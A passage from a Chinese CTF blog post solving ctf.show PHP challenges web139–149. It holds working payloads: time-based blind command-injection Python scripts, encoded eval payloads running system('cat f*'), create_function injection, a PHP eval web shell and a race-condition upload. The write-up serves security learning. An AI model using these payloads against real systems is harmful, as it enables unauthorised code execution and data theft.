         url&#x3D;&quot;http:&#x2F;&#x2F;e5404d73-a384-4498-abe4-fc589c355caf.challenge.ctf.show&#x2F;?c&#x3D;&quot;+payload
         try:
            requests.get(url,timeout&#x3D;(2.5,2.5))
         except:
             result&#x3D;result+n
             print(result)
             break
         if n&#x3D;&#x3D;&#39;9&#39;:
            key&#x3D;1
   result+&#x3D;&quot; &quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>该脚本通过访问根目录，然后通过<code>awk命令</code>、<code>cut命令</code>截取字符，再进行<code>sleep命令</code>确认是否正确，从而对根目录的文件进行一个字符一个字符的爬取，例如当payload为<code>if [ls /|awk &#39;NR==&#123;0&#125;&#39;|cut -c &#123;1&#125; == &#123;2&#125; ];then sleep 3;fi</code></p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401281651907.png"></p>
<p>第二个脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">import requests
import time
import string
str&#x3D;string.digits+string.ascii_lowercase+&quot;-&quot;#获取小写字母与数字
result&#x3D;&quot;&quot;
key&#x3D;0
for j in range(1,45):
   print(j)
   if key&#x3D;&#x3D;1:
      break
   for n in str:
      payload&#x3D;&quot;if [ &#96;cat &#x2F;f149_15_h3r3|cut -c &#123;0&#125;&#96; &#x3D;&#x3D; &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)
      #print(payload)
      url&#x3D;&quot;http:&#x2F;&#x2F;e5404d73-a384-4498-abe4-fc589c355caf.challenge.ctf.show&#x2F;?c&#x3D;&quot;+payload
      try:
         requests.get(url,timeout&#x3D;(2.5,2.5))    #time()第一个参数是响应时间，第二个是读取时间
      except:
          result&#x3D;result+n
          print(result)
          break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再进行第二个脚本可以拿到flag，记得加上{}</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401281702007.png"></p>
<h3 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST[&#39;f1&#39;]) &amp;&amp; isset($_POST[&#39;f2&#39;]))&#123;
  $f1 &#x3D; (String)$_POST[&#39;f1&#39;];
  $f2 &#x3D; (String)$_POST[&#39;f2&#39;];
  if(preg_match(&#39;&#x2F;^[a-z0-9]+$&#x2F;&#39;, $f1))&#123;
    if(preg_match(&#39;&#x2F;^[a-z0-9]+$&#x2F;&#39;, $f2))&#123;
      $code &#x3D; eval(&quot;return $f1($f2());&quot;);
      if(intval($code) &#x3D;&#x3D; &#39;ctfshow&#39;)&#123;
        echo file_get_contents(&quot;flag.php&quot;);
      &#125;
    &#125;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先我们需要<code>POST</code>传参<code>f1</code>、<code>f2</code>，然后对其进行字符强转换。看到<code>$code</code>中的<code>$f1($f2());</code>感觉有点熟悉，不过前面用的是<code>反射类</code>，但是在这里对<code>f1</code>、<code>f2</code>进行了以此<code>preg_match</code>过滤，规定其只能<code>含有小写字母和数字</code>。所以我们需要另辟蹊径了。在这里面需要用到的是松散比较<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/types.comparisons.php">PHP: PHP 类型比较表 - Manual</a>。</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401282032552.png"></p>
<p>当<code>0==字符串</code>时返回的为true，而<code>intval($var,$base)函数</code>有一个特性就是<code>成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。</code>所以当我们使其return为一个<code>非数字字符</code>，其会将其转换为0，而在松散比较中<code>0==字符串</code>为<code>TRUE</code>，那么这个<code>if</code>就可以正常执行，即我们可以使其<code>echo</code>出<code>flag.php</code>中的内容，从而拿到flag  所以我们可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">POST: f1&#x3D;md5&amp;f2&#x3D;md5
POST: f1&#x3D;sleep&amp;f2&#x3D;sleep
POST: f1&#x3D;sha1&amp;f2&#x3D;sha1
POST: f1&#x3D;eval&amp;f2&#x3D;sleep
即只要我们满足该函数仅有小写字母和数字即可(说的太满了T T)。比如俩个eval就不行了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401282021436.png"></p>
<h3 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
\#error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;
  $v1 &#x3D; (String)$_GET[&#39;v1&#39;];
  $v2 &#x3D; (String)$_GET[&#39;v2&#39;];
  $v3 &#x3D; (String)$_GET[&#39;v3&#39;];

  if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;
    if(preg_match(&#39;&#x2F;^\W+$&#x2F;&#39;, $v3))&#123;
      $code &#x3D; eval(&quot;return $v1$v3$v2;&quot;);
      echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;
    &#125;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在该源码中，<code>$v1</code>和<code>$v2</code>对其进行了<code>is_numeric函数</code>判断，使其只有数字。而对<code>$v3</code>的<code>preg_match函数</code>过滤，<code>/^\W+$/</code> 作用是匹配非数字字母下划线的字符。且<code>$v1</code>、<code>$v2</code>、<code>$v3</code>都进行了一些字符串强类型转换。</p>
<p>在php中，当使用<code>return</code>返回值时，数字可以和命令进行一些运算，比如<code>1-sleep();</code>，其是会被判定执行sleep命令的。（除了减号，还有加、乘、除号，但由于正常使用<code>+</code>号会导致其被转换为空格，所以如果使用<code>+</code>，需要对其进行<code>URL编码</code>。）</p>
<p>所以我们可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">GET： v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;-(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5);-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里面<code>(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5);</code>的实际意思为<code>system(cat f*);</code></p>
<p> <strong>system的取反echo urlencode(~’system’);  <strong>取反结果为</strong>%8C%86%8C%8B%9A%92</strong></p>
<p><strong>cat f*的取反echo urlencode(~’cat f*‘); 取反结果为%9C%9E%8B%DF%99%D5</strong></p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401282049919.png"></p>
<h3 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET[&#39;v1&#39;]))&#123;
  $v1 &#x3D; (String)$_GET[&#39;v1&#39;];
  if(is_numeric($v1))&#123;
    $d &#x3D; (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
    sleep($d);
    echo file_get_contents(&quot;flag.php&quot;);
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这题我的大概理解就是<code>get</code>传入的<code>v1</code>，然后对其进行了<code>string</code>(字符)类型转换，再通过<code>is_numeric()</code>对<code>v1</code>进行判断其是否为数字，如果其是数字，则让其与<code>5</code>个<code>0x36d</code>进行相乘，即与<code>5个877</code>(十进制)进行相乘，并对其进行强类型转换，所以这里我们可以用到的就是<code>八进制</code>与<code>十六进制</code>了，由于其下面有一个<code>sleep函数</code>，如果我们为<code>v1</code>哪怕赋个转换值为1，也要睡眠半天，所以我们需要给<code>v1</code>传参使其<code>八进制或十六进制</code>转换后为<code>0</code>。</p>
<pre class="line-numbers language-none"><code class="language-none">即GET: v1&#x3D;0
GET: v1&#x3D;0x0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402282046730.png"></p>
<p>打开源代码即可拿到flag</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402282047117.png"></p>
<h3 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;
  $v1 &#x3D; (String)$_GET[&#39;v1&#39;];
  $v2 &#x3D; (String)$_GET[&#39;v2&#39;];
  $v3 &#x3D; (String)$_GET[&#39;v3&#39;];
  if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;
    if(preg_match(&#39;&#x2F;[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;&#x2F;i&#39;, $v3))&#123;
        die(&#39;get out hacker!&#39;);
    &#125;
    else&#123;
      $code &#x3D; eval(&quot;return $v1$v3$v2;&quot;);
      echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;
    &#125;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>题目描述为web141的plus版，与141相比，本题过滤了更多，仅当<code>v3</code>输出这些字母时不会触发die函数</p>
<pre class="line-numbers language-none"><code class="language-none">!&quot;#&#39;()*,&#x2F;:&lt;&#x3D;&gt;?@[\]^&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>本题没有禁^，所以我们可以通过异或的方式来绕过</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403061407038.png"></p>
<p>可以发现其key为<code>80</code>的时候，异或为正常的linux语句，所以由于其有5个，所以要乘于5个<code>%80</code>以确保都被异或成功，前者同理。</p>
<pre class="line-numbers language-none"><code class="language-none">?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;*(%80%80%80%80%80%80^%F3%F9%F3%F4%E5%ED)(%80%80%80%80%80^%E3%E1%F4%A0%AA)*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>与web141一样，数字与函数进行运算也是可以执行函数的，所以在本题中无论是用<code>*</code>还是<code>^</code>，最终都能从源码中找到flag</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402282102097.png"></p>
<h3 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;
  $v1 &#x3D; (String)$_GET[&#39;v1&#39;];
  $v2 &#x3D; (String)$_GET[&#39;v2&#39;];
  $v3 &#x3D; (String)$_GET[&#39;v3&#39;];

  if(is_numeric($v1) &amp;&amp; check($v3))&#123;
    if(preg_match(&#39;&#x2F;^\W+$&#x2F;&#39;, $v2))&#123;
      $code &#x3D; eval(&quot;return $v1$v3$v2;&quot;);
      echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;
    &#125;
  &#125;
&#125;

function check($str)&#123;
  return strlen($str)&#x3D;&#x3D;&#x3D;1?true:false;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>描述上说是<code>web143的plus</code>版本，相较于<code>web143</code>增添了一个<code>check</code>函数，用来判断传入的<code>$v3</code>，运用了一个三目运算符</p>
<pre class="line-numbers language-none"><code class="language-none">if strlen($v3) &#x3D;&#x3D;&#x3D; 1:
return true
else:
return false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>即判断传入的v3的字符长度必须是<code>1,</code>,这里可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">v1&#x3D;1&amp;v3&#x3D;2&amp;v2&#x3D;*(%80%80%80%80%80%80^%F3%F9%F3%F4%E5%ED)(%80%80%80%80%80^%E3%E1%F4%A0%AA);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>从而拿到flag</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403061420727.png"></p>
<h3 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;
  $v1 &#x3D; (String)$_GET[&#39;v1&#39;];
  $v2 &#x3D; (String)$_GET[&#39;v2&#39;];
  $v3 &#x3D; (String)$_GET[&#39;v3&#39;];
  if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;
    if(preg_match(&#39;&#x2F;[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\&#x2F;|\^|\#|\&quot;&#x2F;i&#39;, $v3))&#123;
        die(&#39;get out hacker!&#39;);
    &#125;
    else&#123;
      $code &#x3D; eval(&quot;return $v1$v3$v2;&quot;);
      echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;
    &#125;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此题描述为<code>web144的plus版本</code>，通过fuzz脚本，我们可以看到此题我们还能用到哪些字符</p>
<pre class="line-numbers language-none"><code class="language-none">&#39;(),:&#x3D;?[\]&#96;&#123;|~<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此时<code>~</code>还没有被过滤，本题的考点在于对三目运算符的巧用。可以构造payload</p>
<pre class="line-numbers language-none"><code class="language-none">v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5):<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403061928182.png"></p>
<p>或者可以利用<code>|()|</code>的方式来构造payload</p>
<pre class="line-numbers language-none"><code class="language-none">v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;|(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)|<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403061930939.png"></p>
<h3 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;
  $v1 &#x3D; (String)$_GET[&#39;v1&#39;];
  $v2 &#x3D; (String)$_GET[&#39;v2&#39;];
  $v3 &#x3D; (String)$_GET[&#39;v3&#39;];
  if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;
    if(preg_match(&#39;&#x2F;[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\&#x2F;|\^|\#|\&quot;&#x2F;i&#39;, $v3))&#123;
        die(&#39;get out hacker!&#39;);
    &#125;
    else&#123;
      $code &#x3D; eval(&quot;return $v1$v3$v2;&quot;);
      echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;
    &#125;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>套娃了，这题的描述是<code>web145的plus版本</code>，可用的字符为</p>
<pre class="line-numbers language-none"><code class="language-none">&#39;(),&#x3D;?[\]&#96;&#123;|~<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>分号被过滤了，这题用不了三目运算符，不过发现上题第二种方法还是能够拿到flag</p>
<pre class="line-numbers language-none"><code class="language-none">v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;|(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)|<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403061936724.png"></p>
<p>看佬博客还有一种构造方法，是利用等号和位运算符</p>
<pre class="line-numbers language-none"><code class="language-none">v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;&#x3D;&#x3D;(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);

if(isset($_POST[&#39;ctf&#39;]))&#123;
  $ctfshow &#x3D; $_POST[&#39;ctf&#39;];
  if(!preg_match(&#39;&#x2F;^[a-z0-9_]*$&#x2F;isD&#39;,$ctfshow)) &#123;
    $ctfshow(&#39;&#39;,$_GET[&#39;show&#39;]);
  &#125;

&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过fuzz脚本，我们可以看到<code>$ctfshow</code>只能用如下的字符</p>
<pre class="line-numbers language-none"><code class="language-none">!&quot;#$%&amp;&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^&#96;&#123;|&#125;~<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>本题不会，看网上佬写的wp，本题的考点是<a target="_blank" rel="noopener" href="https://my.oschina.net/huyex/blog/2885273">create_function函数注入</a>,利用create_function进行代码注入，需要用到<code>&#125;</code>闭合原来的函数，然后再执行新的命令，并且通过注释来将多余的<code>&#125;</code>，在php中，默认存放的位置在<code>\</code>。所有原生的类和方法都在这个命令空间。所以我们可以通过为<code>ctf</code>传参来调用<code>create_function</code>函数，然后再通过<code>GET</code>传参<code>show</code>进行执行命令。</p>
<pre class="line-numbers language-none"><code class="language-none">GET: ?show&#x3D;&#125;system(&quot;cat f*&quot;);&#x2F;&#x2F;
POST: ctf&#x3D;\create_function<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>成功拿到flag</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403062010405.png"></p>
<h3 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
include &#39;flag.php&#39;;
if(isset($_GET[&#39;code&#39;]))&#123;
  $code&#x3D;$_GET[&#39;code&#39;];
  if(preg_match(&quot;&#x2F;[A-Za-z0-9_\%\\|\~\&#39;\,\.\:\@\&amp;\*\+\- ]+&#x2F;&quot;,$code))&#123;
    die(&quot;error&quot;);
  &#125;
  @eval($code);
&#125;
else&#123;
  highlight_file(__FILE__);
&#125;

function get_ctfshow_fl0g()&#123;
  echo file_get_contents(&quot;flag.php&quot;);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>只有当我们输入以下字符时不会触发<code>die函数</code></p>
<pre class="line-numbers language-none"><code class="language-none">!&quot;#$()&#x2F;;&lt;&#x3D;&gt;?[\]^&#96;&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以发现我们可以进行异或来实现代码，所以我们可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">code&#x3D;(&quot;%80%80%80%80%80%80&quot;^&quot;%F3%F9%F3%F4%E5%ED&quot;)(&quot;%80%80%80%80%80&quot;^&quot;%E3%E1%F4%A0%AA&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>拿到flag</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403062020119.png"></p>
<h3 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);

$files &#x3D; scandir(&#39;.&#x2F;&#39;); 
foreach($files as $file) &#123;
  if(is_file($file))&#123;
    if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123;
      unlink($file);
    &#125;
  &#125;
&#125;
file_put_contents($_GET[&#39;ctf&#39;], $_POST[&#39;show&#39;]);
$files &#x3D; scandir(&#39;.&#x2F;&#39;); 
foreach($files as $file) &#123;
  if(is_file($file))&#123;
    if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123;
      unlink($file);
    &#125;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>本题描述**”你写的快还是我删的快”**运用到一个<code>unlink函数</code></p>
<pre class="line-numbers language-none"><code class="language-none">unlink
(PHP 4, PHP 5, PHP 7)
unlink — 删除文件
说明
unlink ( string &#96;$filename&#96; [, resource &#96;$context&#96; ] ) : bool
删除 &#96;filename&#96;。和 Unix C 的 unlink() 函数相似。 发生错误时会产生一个 &#96;E_WARNING&#96; 级别的错误。
参数
- &#96;filename&#96;
  文件的路径。
- &#96;context&#96;
  Note: 在 PHP 5.0.0 中增加了对上下文（Context）的支持。有关上下文（Context）的说明参见 [Streams](php&#x2F;book.stream.html)。
返回值
成功时返回 &#96;TRUE&#96;， 或者在失败时返回 &#96;FALSE&#96;。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最直接的一个方法就是，你不删除<code>index.php</code>,那就依从你呗，不过我要在该文件里面写🐎，你也会依从我吧，所以我们可以构造payload</p>
<pre class="line-numbers language-none"><code class="language-none">GET: ctf&#x3D;index.php
POST: show&#x3D;&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403062030863.png"></p>
<p>其次就是本题的一个考点了，<code>条件竞争漏洞</code>，payload的构造</p>
<pre class="line-numbers language-none"><code class="language-none">GET: ctf&#x3D;1.php
POST: &lt;?php system(&#39;ls &#x2F;&#39;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>放在BP测试器里面进行<code>没有负载无限制重复</code>，我没有搞成功，不过看网上有的佬写的wp是试成功了。</p>
<h3 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h3>
                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Know5</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://know5.github.io/2024/02/06/php%E7%89%B9%E6%80%A7/">https://know5.github.io/2024/02/06/php%E7%89%B9%E6%80%A7/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">Know5</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/php%E5%AD%A6%E4%B9%A0/">
                                    <span class="chip bg-color">php学习</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2024/02/06/HgameCTF-Week1/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="HgameCTF-Week1">
                        
                        <span class="card-title">HgameCTF-Week1</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2024-02-06
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Know5
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF%E3%80%81%E6%96%B0%E6%89%8B%EF%BC%8C%E8%8F%9C%E8%8F%9C/">
                        <span class="chip bg-color">CTF、新手，菜菜</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/11/30/2023ISCTF%E9%83%A8%E5%88%86WP/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="2023ISCTF部分WP">
                        
                        <span class="card-title">2023ISCTF部分WP</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-11-30
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Know5
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E6%96%B0%E6%89%8B%EF%BC%8CWEB%EF%BC%8CMISC/">
                        <span class="chip bg-color">新手，WEB，MISC</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>



<!-- 代码语言 -->

